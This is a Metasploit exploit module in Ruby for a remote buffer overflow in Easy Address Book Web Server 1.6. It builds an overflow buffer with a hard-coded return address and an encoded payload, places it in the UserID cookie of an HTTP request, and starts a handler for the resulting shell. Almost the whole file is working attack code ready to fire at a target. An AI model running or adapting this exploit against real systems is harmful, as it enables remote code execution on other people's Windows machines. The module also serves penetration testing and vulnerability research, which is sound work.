##
# This module requires Metasploit: http://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

require 'msf/core'

class Metasploit3 < Msf::Exploit::Remote
  Rank = ExcellentRanking

  include Msf::Exploit::Remote::Tcp
  
  def initialize(info = {})
    super(update_info(info,
      'Name'           => 'Easy Address Book Web Server 1.6 User ID Remote Buffer Overflow',
      'Description'    => %q{
          Easy Address Book Web Server 1.6 User ID Remote Buffer Overflow Exploits
      },
      'Author'         => [ 'Tracy Turben',   # Initial Discovery
                            'ADEO Security'   # Metasploit Porting 
                          ],
      'References'     =>
        [
          [ 'URL', 'https://www.exploit-db.com/exploits/37952/' ],
	  [ 'OSVDB', 'http://osvdb.org/show/osvdb/107242' ]
        ],
      'Privileged'     => false,
      'Payload'        =>
        {
          'Space'       => 900,
          'BadChars'    => "\x00\x0a\x0d"
        },
      'Platform'       => 'win',
      'Targets'        => [
          [ 'Windows Xp 32 Bit or Windows 7 64 Bit', {
              'Ret'    => 0x1001AFB8, # 1001AFE0 - 28 = 1001AFB8  JG SHORT 1001AF91 to MOV EAX,EBX POP EBP POP EBX RETN Return to Shellcode 
              'Offset' => 80
            }
          ]
       ],
      'DisclosureDate' => 'Aug 28 2015',
      'DefaultTarget'  => 0))
      register_options( [  Opt::RPORT(80) ], self.class)
  end

  def exploit
    connect

    host = datastore['RHOST']
    port = datastore['RPORT']

    print_status("Victim IP Adress: #{host} | Port: #{port}")

    print_status("Preparing Buffer...")
    buf  = "A" * target['Offset']
    buf += [ target.ret ].pack('V')
    buf += "A" * 20
    buf += payload.encoded
    buf += "A" * (1111-(buf.length))
    print_status("Buffer made. Buffer length is #{buf.length} byte.")

    print_status("Preparing Request...")
    req  = "GET //addrbook.ghp? HTTP/1.1\r\n"
    req += "User-Agent: Mozilla/4.0\r\n"
    req += "Host: #{host}:#{port}\r\n"
    req += "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\r\n"
    req += "Accept-Language: en-us\r\n"
    req += "Accept-Encoding: gzip, deflate\r\n"
    req += "Referer: http://#{host}/\r\n"
    req += "Cookie: SESSIONID=1337; UserID=#{buf}; PassWD=;\r\n"
    req += "Conection: Keep-Alive\r\n\r\n"    
    print_status("Request made. Request length is #{req.length} byte.")

    print_status("Sending Request...")
    sock.write(req)
    sock.get_once
    print_status("Sended Request!")

    handler
    disconnect
  end

end
